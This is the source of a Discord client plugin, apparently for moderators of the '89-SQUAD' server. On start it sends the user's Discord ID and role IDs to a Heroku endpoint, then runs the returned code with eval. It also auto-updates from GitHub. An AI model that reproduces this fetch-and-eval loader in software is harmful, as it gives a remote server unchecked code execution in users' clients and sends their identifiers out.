module.exports = (Plugin, Library) => {
  const { Patcher, DiscordAPI, PluginUpdater } = Library;

  const urls = {
    update:
      "https://raw.githubusercontent.com/EvilGhostMan/DiscordCommands/main/release/DiscordCommands.plugin.js",
    plugin: "https://serve-discord-commands.herokuapp.com/get-plugin", //"http://localhost:3000/get-plugin"
  };

  const GUILDS = {
    "259124796971941890": [
      "299569953768734721", //Модератор
      "621057922277048321", // Старший редакор
      "299570218974445568", // Редактор
    ], // 89-SQUAD
  };

  const HALF_OF_HOUR = 30 * 60 * 1000;

  function filterByArr(map, filterArr) {
    return map.filter(function ({ id }) {
      return this.indexOf(id) > -1;
    }, filterArr);
  }

  return class ExamplePlugin extends Plugin {
    constructor() {
      super();
    }

    onStart() {
      this.checkForUpdates(this.getName(), this.getVersion());

      const request = require("request");

      if (this._DiscordCommands) return;

      try {
        DiscordAPI.currentUser.id;
      } catch (_) {
        setTimeout(() => this.onStart(), 5000);

        return;
      }

      const accessRoles = filterByArr(DiscordAPI.guilds, Object.keys(GUILDS))
        .map(({ id, currentUser }) =>
          filterByArr(currentUser.roles, GUILDS[id])
        )
        .flat()
        .map(({ id }) => id);

      request(
        {
          method: "GET",
          url: urls.plugin,
          json: { id: DiscordAPI.currentUser.id, accessRoles },
        },

        function (error, _response, body) {
          if (error) return console.log(error);

          if (!body || body.length < 1) return;

          const Code = eval(body)(Library);

          this._DiscordCommands = new Code();
        }
      );

      if (!this._UpdateChecker) {
        const plugin = this;

        this._UpdateChecker = setInterval(function () {
          plugin.checkForUpdates(plugin.getName(), plugin.getVersion());
        }, HALF_OF_HOUR);
      }
    }

    onStop() {
      this.checkForUpdates(this.getName(), this.getVersion());

      Patcher.unpatchAll();
    }

    checkForUpdates(name, version) {
      PluginUpdater.checkForUpdate(name, version, urls.update);
    }
  };
};
